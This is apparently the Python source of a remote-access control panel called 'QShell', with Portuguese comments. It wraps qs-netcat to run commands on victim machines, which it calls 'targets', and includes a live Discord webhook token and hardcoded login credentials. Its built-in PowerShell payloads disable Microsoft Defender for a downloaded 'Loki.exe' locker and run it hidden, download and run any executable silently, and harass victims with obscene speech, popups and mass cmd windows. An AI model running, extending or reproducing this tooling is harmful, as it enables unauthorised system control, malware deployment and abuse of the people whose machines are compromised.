#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import subprocess
import queue
import os
import json
import time
import sys
import re
from datetime import datetime
from colorama import Fore, init, Style

# ===== CONFIGS =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1532440059125563516/dbuP2aBxvn6nEOqLKUw-A8hFvFJ7gNpNSajeU6UPKhG_UV28vBEXnc740s_aDjOY-xGc"
QSHELL_DIR  = r"C:\Users\unkno\AppData\Roaming\ZagGV"
QSHELL_EXE  = "qs-netcat.exe"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5550
USERS_FILE  = "users.json"
SECRET_FILE = "byt3all_secret.txt"

# ===== CARREGA CONFIGS =====
def load_secret_key():
    try:
        if os.path.exists(SECRET_FILE):
            with open(SECRET_FILE, 'r') as f:
                return f.read().strip()
    except:
        pass
    return "ijbH382muvDxq0mqy2KMTFFP"

SECRET_KEY = load_secret_key()

def load_users_json():
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return data.get('users', [])
    except:
        pass
    return [{"username": "root", "password": "Byt3l0rd",
             "created": datetime.now().strftime('%d/%m/%Y %H:%M:%S')}]

def authenticate_user_json(username, password):
    for u in load_users_json():
        if u.get('username') == username and u.get('password') == password:
            return True
    return False

def is_admin_json(username):
    for u in load_users_json():
        if u.get('username') == username:
            return username == 'root'
    return False

# ===== CORES =====
RED    = Fore.RED
GREEN  = Fore.GREEN
YELLOW = Fore.YELLOW
WHITE  = Fore.WHITE
RESET  = Fore.RESET
BOLD   = Style.BRIGHT

# ===== BANNER =====
BANNER = (
    f"{RED}⠀⠀⠀⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃\r\n"
    f"{RED}⠀⠀⠀⠀⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀\r\n"
    f"{RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀\r\n"
    f"{WHITE}                 ( Type \"help\" for Commands )\r\n"
    f"{WHITE}                  QShell by: Byt3l0rd and Trash\r\n"
)

BANNER_LOGIN = (
    f"{RED}            ( Discord: byt3l0rd. )\r\n"
    f"{RED}           (  Telegram: larphyw   )\r\n"
    f"{RED}        QShell by: Byt3l0rd and Trash\r\n"
)

# ===== HELPER DE ENVIO =====
def send_msg(client_socket, text):
    if isinstance(text, str):
        text = text.replace('\r\n', '\n').replace('\n', '\r\n')
        client_socket.send(text.encode('utf-8', errors='ignore'))
    else:
        client_socket.send(text)

# ===== TELA =====
def send_clear(client_socket):
    client_socket.send(b"\x1b[3J\x1b[2J\x1b[H")

def send_banner(client_socket, banner_type='main'):
    send_clear(client_socket)
    if banner_type == 'login':
        client_socket.send(BANNER_LOGIN.encode('utf-8', errors='ignore'))
    else:
        client_socket.send(BANNER.encode('utf-8', errors='ignore'))
    client_socket.send(b"\r\n")

# ===== MENUS =====
def show_help():
    return (
        f"\r\n{WHITE}List of commands:\r\n"
        f"{RED}HELP         {WHITE}Shows list of commands\r\n"
        f"{RED}INFO         {WHITE}Shows account information\r\n"
        f"{RED}QSHELL       {WHITE}Connect to QShell target\r\n"
        f"{RED}CLEAR        {WHITE}Clears the screen\r\n"
        f"{RED}EXIT         {WHITE}Disconnects from the net\r\n"
        f"{RED}!USER        {WHITE}User management (Admin only)\r\n"
        f"{RESET}\r\n"
    )

def show_info(username):
    users = load_users_json()
    user_data = next((u for u in users if u.get('username') == username), None)
    if not user_data:
        return f"{RED}[!] User not found{RESET}\r\n"
    created  = user_data.get('created', 'N/A')
    is_admin = is_admin_json(username)
    try:
        created_date = datetime.strptime(created, '%d/%m/%Y %H:%M:%S')
        expiry_date  = created_date.replace(year=created_date.year + 1)
        days_left    = (expiry_date - datetime.now()).days
        expiry_str   = (f"{days_left // 365} Year(s) and {days_left % 365} Day(s)"
                        if days_left >= 0 else "EXPIRED")
    except:
        expiry_str = "N/A"
    admin_str = 'true' if is_admin else 'false'
    return (
        f"\r\n{WHITE}[Account Info]                                   Type \"CLS\" to go back\r\n"
        f"\r\n  Username  >  {RED}{username}{WHITE}\r\n"
        f"  Expiry    >  {RED}{expiry_str}{WHITE}\r\n"
        f"  VIP       >  {RED}{admin_str}{WHITE}\r\n"
        f"  Admin     >  {RED}{admin_str}{WHITE}\r\n"
        f"  API       >  {RED}false{WHITE}\r\n"
        f"  PASSWD    >  {RED}change account password{WHITE}\r\n"
        f"\r\n VERSION: 0.5 > Support: @larphyw on T\r\n{RESET}\r\n"
    )

# ===== ENCONTRA QSHELL =====
def find_qshell_executable():
    possible = [
        os.path.join(QSHELL_DIR, QSHELL_EXE),
        r"C:\Users\unkno\AppData\Roaming\ZagGV\qs-netcat.exe",
        QSHELL_EXE,
    ]
    for p in possible:
        if os.path.exists(p):
            return p
    try:
        r = subprocess.run(f'where {QSHELL_EXE}', shell=True,
                           capture_output=True, text=True)
        if r.stdout.strip():
            return r.stdout.strip().split('\n')[0]
    except:
        pass
    return None

# ===== ATALHOS POWERSHELL =====
def build_powershell_command(cmd, args):
    fixed_commands = {
        'falar2': (
            'powershell -command "Add-Type -AssemblyName System.Speech; '
            '$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; '
            '$s.Volume=100; $s.Rate=0; $s.Speak(\'bytelord gozou na boquinha\')"'
        ),
        'falar3': (
            'powershell -command "Add-Type -AssemblyName System.Speech; '
            '$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; '
            '$s.Volume=100; $s.Rate=0; $s.Speak(\'BYT3L0RD TE PEGOU\')"'
        ),
        'wallpaper': (
            'powershell -command "$url=\'https://i.pinimg.com/736x/88/5b/7c/885b7c5c7b5af868115e00d419740c74.jpg\'; '
            '$path=\'$env:USERPROFILE\\Pictures\\wallpaper.jpg\'; '
            'Invoke-WebRequest -Uri $url -OutFile $path; '
            'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; '
            'public class WP{[DllImport(chr(34)+\'user32.dll\'+chr(34),CharSet=CharSet.Auto)]'
            'public static extern int SystemParametersInfo(int a,int b,string c,int d);}\'; '
            '[WP]::SystemParametersInfo(20,0,$path,3)"'
        ),
        'popup': (
            'powershell -command "Add-Type -AssemblyName System.Windows.Forms; '
            '[System.Windows.Forms.MessageBox]::Show(\'AIN MEU CUZINHOOOWWW\',\'BYT3L0RD\')"'
        ),
        'beep': (
            'powershell -command "for($i=0;$i-lt5;$i++){'
            '[Console]::Beep(800,200);Start-Sleep -Milliseconds 100}"'
        ),
        'beep2': (
            'powershell -command "[Console]::Beep(800,200);'
            '[Console]::Beep(1000,200);[Console]::Beep(1200,300)"'
        ),
        'beep3': (
            'powershell -command "$melody=@(800,200,1000,200,1200,300,1000,200,800,200); '
            'for($i=0;$i-lt$melody.Length;$i+=2){[Console]::Beep($melody[$i],$melody[$i+1])}"'
        ),
        'popupcmds': (
            'powershell -command "Add-Type -AssemblyName System.Windows.Forms; '
            '[System.Windows.Forms.MessageBox]::Show(\'ABRINDO 100 CMDS\',\'ZOEIRA\'); '
            'for($i=0;$i-lt100;$i++){start cmd}"'
        ),
        'locker': (
            'powershell -command "$url=\'https://raw.githubusercontent.com/unknownijs/contrilokss/refs/heads/main/Loki.exe\'; '
            '$out=\'C:\\Windows\\Temp\\Loki.exe\'; '
            'Add-MpPreference -ExclusionPath $out -Force -ErrorAction SilentlyContinue; '
            '(New-Object Net.WebClient).DownloadFile($url,$out); '
            'Write-Host \'✅ Loki.exe baixado para C:\\Windows\\Temp\\Loki.exe\'"'
        ),
        'lokiexec': (
            'powershell -command "Start-Process \'C:\\Windows\\Temp\\Loki.exe\' -WindowStyle Hidden"'
        ),
        'remover': (
            'powershell -command "taskkill /f /im Loki.exe 2>$null; '
            'taskkill /f /im Locker.exe 2>$null; '
            'Remove-Item \'$env:TEMP\\Loki.exe\',\'$env:TEMP\\Locker.exe\','
            '\'C:\\Windows\\Temp\\Loki.exe\',\'C:\\Windows\\Temp\\Locker.exe\' '
            '-Force -ErrorAction SilentlyContinue; '
            'Write-Host \'LOKERS DELETADOS!\'"'
        ),
        'cmdmsg':  'start cmd /c "echo BYT3L0RD ESTA VENDO TUDO & pause"',
        'cmdmsg2': 'start cmd /c "echo byt3l0rd & pause"',
    }

    if cmd in fixed_commands:
        return fixed_commands[cmd]

    if cmd == 'falar' and args:
        frase = args.replace("'", "''")
        return (
            f'powershell -command "Add-Type -AssemblyName System.Speech; '
            f'$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; '
            f'$s.Volume=100; $s.Rate=0; $s.Speak(\'{frase}\')"'
        )

    if cmd == 'download' and args:
        return (
            f'powershell -command "$url=\'{args}\'; '
            f'$name=[System.IO.Path]::GetFileName($url); '
            f'if(!$name){{$name=\'downloaded.bin\'}}; '
            f'$path=\'$env:TEMP\\\'+$name; '
            f'Invoke-WebRequest -Uri $url -OutFile $path; '
            f'Write-Host \'Arquivo salvo em: \'$path"'
        )

    if cmd == 'dexec' and args:
        return (
            f'powershell -command "$url=\'{args}\'; '
            f'$name=[System.IO.Path]::GetFileName($url); '
            f'if(!$name){{$name=\'downloaded.exe\'}}; '
            f'$path=\'$env:TEMP\\\'+$name; '
            f'Invoke-WebRequest -Uri $url -OutFile $path; '
            f'Start-Process -FilePath $path -WindowStyle Hidden"'
        )

    return None

# ===== RECV LINE =====
def recv_line(client_socket, timeout=120):
    client_socket.settimeout(timeout)
    data = b''
    while True:
        try:
            chunk = client_socket.recv(1)
            if not chunk:
                return data.decode('utf-8', errors='ignore').strip()
            byte = chunk[0]
            if byte == 0xFF:
                try:
                    client_socket.recv(2)
                except:
                    pass
                continue
            if chunk == b'\n':
                break
            if chunk == b'\r':
                continue
            if byte < 32 and byte not in (9,):
                continue
            data += chunk
        except socket.timeout:
            return data.decode('utf-8', errors='ignore').strip()
        except:
            return data.decode('utf-8', errors='ignore').strip()
    return data.decode('utf-8', errors='ignore').strip()

# ===== QSHELL =====
def run_qshell_fixed(key, client_socket, username, client_ip, client_port):
    qshell_path = find_qshell_executable()
    if not qshell_path:
        send_msg(client_socket, f"{RED}[X] QShell (qs-netcat.exe) não encontrado\r\n{RESET}")
        return False

    try:
        CREATE_NO_WINDOW = 0x08000000 if sys.platform == 'win32' else 0
        proc = subprocess.Popen(
            [qshell_path, '-s', key],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=QSHELL_DIR,
            creationflags=CREATE_NO_WINDOW,
        )
    except Exception as e:
        send_msg(client_socket, f"{RED}[X] Erro ao iniciar QShell: {e}\r\n{RESET}")
        return False

    out_q  = queue.Queue()
    alive  = [True]

    def _reader():
        try:
            while alive[0]:
                chunk = proc.stdout.read(256)
                if not chunk:
                    break
                out_q.put(chunk)
        except:
            pass

    threading.Thread(target=_reader, daemon=True).start()

    def drain(wait=1.5):
        buf      = b''
        deadline = time.time() + wait
        while time.time() < deadline:
            try:
                chunk     = out_q.get(timeout=0.1)
                buf      += chunk
                deadline  = time.time() + 0.35
            except queue.Empty:
                if buf:
                    break
        return buf

    def forward(raw_bytes):
        if not raw_bytes:
            return
        text = raw_bytes.decode('utf-8', errors='ignore')
        text = text.replace('\r\n', '\n').replace('\r', '\n').replace('\n', '\r\n')
        client_socket.send(text.encode('utf-8'))

    time.sleep(3.0)
    forward(drain(2.0))

    if proc.poll() is not None:
        send_msg(client_socket,
                 f"{RED}[X] Conexão falhou. Verifique a chave e se o alvo está online.\r\n{RESET}")
        return False

    # ===== LIMPA A TELA E MOSTRA SÓ O QUE EU QUERO =====
    send_clear(client_socket)
    send_msg(client_socket,
             f"{GREEN}[+] Conectado!  {YELLOW}'exit'{GREEN} para desconectar.\r\n"
             f"[+] Atalhos: falar \"frase\", download <url>, dexec <url>\r\n"
             f"[+] Outros: falar2 falar3 wallpaper popup beep beep2 beep3 popupcmds\r\n"
             f"[+] locker (baixa Loki.exe) | lokiexec (executa Loki.exe) | remover\r\n"
             f"[+] cmdmsg cmdmsg2\r\n\r\n{RESET}")

    while True:
        send_msg(client_socket, f"{RED}shell>{RESET} ")
        line = recv_line(client_socket, timeout=300)

        if not line:
            if proc.poll() is not None:
                forward(drain(0.5))
                send_msg(client_socket, f"\r\n{YELLOW}[!] Conexão encerrada pelo alvo.\r\n{RESET}")
                break
            continue

        if line.lower() in ('exit', 'quit', 'sair'):
            alive[0] = False
            try:
                proc.terminate()
            except:
                pass
            send_msg(client_socket, f"{YELLOW}[!] Desconectado.\r\n{RESET}")
            break

        parts = line.strip().split(maxsplit=1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ''

        actual_cmd = build_powershell_command(cmd, args)

        if actual_cmd is None:
            actual_cmd = line

        try:
            proc.stdin.write(f"{actual_cmd}\r\n".encode('utf-8'))
            proc.stdin.flush()
        except:
            send_msg(client_socket, f"{RED}[X] Conexão perdida.\r\n{RESET}")
            break

        forward(drain(2.0))

        if proc.poll() is not None:
            forward(drain(0.5))
            send_msg(client_socket, f"\r\n{YELLOW}[!] Conexão encerrada.\r\n{RESET}")
            break

    alive[0] = False
    return True

# ===== HANDLE QSHELL CONNECTION =====
def handle_qshell_connection(client_socket, username, client_ip, client_port):
    send_clear(client_socket)
    send_msg(client_socket,
        f"\r\n{YELLOW}╔═══════════════════════════════════════════════════════════╗\r\n"
        f"║              QSHELL - CONEXÃO                             ║\r\n"
        f"║  Digite a chave/secret do alvo para conectar              ║\r\n"
        f"║  Exemplo: skahfaslkfhal293u09akjh                        ║\r\n"
        f"╚═══════════════════════════════════════════════════════════╝{RESET}\r\n"
        f"\r\n{WHITE}[?] CHAVE/SECRET DO ALVO: {RESET}"
    )
    key = recv_line(client_socket)
    if not key or key.lower() in ('exit', 'sair', 'cancel'):
        send_msg(client_socket, f"{YELLOW}[!] Cancelado.\r\n{RESET}")
        return
    run_qshell_fixed(key, client_socket, username, client_ip, client_port)

# ===== USER MANAGEMENT =====
def handle_user_management(client_socket, username):
    send_clear(client_socket)
    send_msg(client_socket,
        f"\r\nUser Management\r\n"
        f"{WHITE}[1]{RESET} List Users\r\n"
        f"{WHITE}[2]{RESET} Add User\r\n"
        f"{WHITE}[3]{RESET} Remove User\r\n"
        f"{WHITE}[4]{RESET} Back\r\n"
        f"{RED}Choose: {RESET}"
    )
    option = recv_line(client_socket)

    if option == '1':
        users = load_users_json()
        send_msg(client_socket, f"\r\n{WHITE}Registered Users:{RESET}\r\n")
        for user in users:
            role = "Admin" if user.get('username') == 'root' else "User"
            send_msg(client_socket,
                f"  {WHITE}{user.get('username')}{RESET}"
                f" - {role} (created: {user.get('created','N/A')})\r\n")
        send_msg(client_socket, f"\r\n{RED}Press Enter to continue...{RESET}")
        recv_line(client_socket)

    elif option == '2':
        send_msg(client_socket, f"{WHITE}[+] New username: {RESET}")
        new_user = recv_line(client_socket)
        if new_user:
            send_msg(client_socket, f"{WHITE}[+] Password: {RESET}")
            new_pass = recv_line(client_socket)
            try:
                with open(USERS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
            except:
                data = {"users": []}
            data['users'].append({
                "username": new_user,
                "password": new_pass,
                "created":  datetime.now().strftime('%d/%m/%Y %H:%M:%S')
            })
            with open(USERS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            send_msg(client_socket, f"{GREEN}[V] User {new_user} created!\r\n{RESET}")

    elif option == '3':
        send_msg(client_socket, f"{RED}[!] Username to remove: {RESET}")
        del_user = recv_line(client_socket)
        if del_user and del_user != 'root':
            try:
                with open(USERS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                data['users'] = [u for u in data['users']
                                  if u.get('username') != del_user]
                with open(USERS_FILE, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=4, ensure_ascii=False)
                send_msg(client_socket, f"{GREEN}[V] User {del_user} removed!\r\n{RESET}")
            except Exception as e:
                send_msg(client_socket, f"{RED}[X] Error: {e}\r\n{RESET}")
        else:
            send_msg(client_socket, f"{RED}[X] Cannot remove root!\r\n{RESET}")

# ===== HANDLE CLIENT =====
def handle_client(client_socket, addr):
    client_ip, client_port = addr
    client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    authenticated = False
    username      = None

    try:
        send_banner(client_socket, 'login')

        attempts = 0
        while not authenticated and attempts < 3:
            send_msg(client_socket, f"{RED}Username :{RESET} ")
            username = recv_line(client_socket)
            if not username:
                continue
            send_msg(client_socket, f"{RED}Password :{RESET} ")
            password = recv_line(client_socket)
            if not password:
                continue
            if authenticate_user_json(username, password):
                authenticated = True
                send_msg(client_socket, f"{GREEN}[+] Login Success!\r\n{RESET}")
                client_socket.send(b"\x1b]0;QShell by: Byt3l0rd\x07")
            else:
                attempts += 1
                send_msg(client_socket, f"{RED}[!] Invalid credentials\r\n{RESET}")

        if not authenticated:
            send_msg(client_socket,
                     f"{RED}[!] Max attempts exceeded. Disconnecting...\r\n{RESET}")
            client_socket.close()
            return

        prompt      = f"{RED}({WHITE}QSHELL{RED}@{WHITE}{username}{RED}) > {RESET}"
        show_banner = True

        while True:
            if show_banner:
                send_banner(client_socket)
                send_msg(client_socket,
                         f"{WHITE}[+] Logado como: {username}\r\n{RESET}")
                show_banner = False

            send_msg(client_socket, prompt)
            raw_cmd = recv_line(client_socket)

            if not raw_cmd:
                continue

            parts   = raw_cmd.strip().split()
            command = parts[0].upper() if parts else ''

            if command == 'HELP':
                send_msg(client_socket, show_help())

            elif command == 'INFO':
                send_msg(client_socket, show_info(username))

            elif command in ('QSHELL', 'CONNECT', 'QBYTE', 'BYT3ALL'):
                handle_qshell_connection(client_socket, username,
                                         client_ip, client_port)
                show_banner = True

            elif command in ('CLEAR', 'CLS'):
                send_clear(client_socket)

            elif command in ('EXIT', 'LOGOUT'):
                send_msg(client_socket, f"{RED}[!] Logging out...\r\n{RESET}")
                break

            elif command in ('!USER', '!U'):
                if is_admin_json(username):
                    handle_user_management(client_socket, username)
                    show_banner = True
                else:
                    send_msg(client_socket, f"{RED}[!] Admin only!\r\n{RESET}")

            else:
                send_msg(client_socket,
                         f"{RED}[!] Unknown command: {command}\r\n{RESET}")

    except Exception as e:
        print(f"{RED}[!] Erro no cliente {addr}: {e}{RESET}")
    finally:
        try:
            client_socket.close()
        except:
            pass

# ===== SERVIDOR PRINCIPAL =====
def main():
    init(autoreset=True)
    if sys.platform == 'win32':
        os.system('chcp 65001 > nul')

    print(f"{BOLD}{RED}QSHELL RAW SERVER v3.0{RESET}")
    print(f"{BOLD}{RED}by: Byt3l0rd and Trash{RESET}")

    users = load_users_json()
    print(f"{GREEN}[+] {len(users)} users loaded{RESET}")
    print(f"{GREEN}[+] Master key loaded [HIDDEN]{RESET}")

    qshell_path = find_qshell_executable()
    if qshell_path:
        print(f"{GREEN}[+] QShell encontrado em: {qshell_path}{RESET}")
    else:
        print(f"{RED}[!] QShell (qs-netcat.exe) não encontrado{RESET}")

    print(f"{GREEN}[+] Listening on {SERVER_HOST}:{SERVER_PORT}{RESET}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((SERVER_HOST, SERVER_PORT))
        server.listen(100)
        print(f"{GREEN}[V] Server ready! Connect via: putty {SERVER_HOST} {SERVER_PORT}{RESET}")

        while True:
            client, addr = server.accept()
            print(f"{WHITE}[+] Connection from {addr[0]}:{addr[1]}{RESET}")
            threading.Thread(target=handle_client, args=(client, addr),
                             daemon=True).start()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Server stopped{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    finally:
        server.close()


if __name__ == "__main__":
    main()